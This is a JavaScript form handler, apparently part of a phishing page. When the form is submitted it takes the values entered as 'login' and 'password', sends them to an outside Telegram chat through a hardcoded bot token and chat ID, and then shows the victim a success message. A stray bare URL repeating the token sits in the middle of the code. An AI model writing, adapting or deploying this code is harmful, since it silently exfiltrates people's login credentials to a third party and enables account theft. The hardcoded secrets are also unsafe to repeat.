const TOKEN = "7848719568:AAHZIzYoHhCIFfF-RU0mQvFDH8uYGrmKoZg"
const CHAT_ID = "6939590174"
const UPI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage `
const success =  document.getElementById("success")

https://https://api.telegram.org/bot7848719568:AAHZIzYoHhCIFfF-RU0mQvFDH8uYGrmKoZg/getupdates
    document.getElementById("tg").addEventListener("submit", function (e) {
        e.preventDefault()
        console.log(this.radio.value)
        let message = `Заявка на сайт\n`;
        message += `login:  ${this.name.value}\n`;
        message += `password: ${this.tel.value}`;

        axios.post(UPI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
        })
            .then((res) => {
                this.name.value = "";
                this.tel.value = "";
                // success.innerHTML = "отправельно!";
                success.style.display = "block";
            })
            .catch((err) => {
                console.warn(err)
            })
            .finally(() => {
                console.log("Успешно")
            })
    })


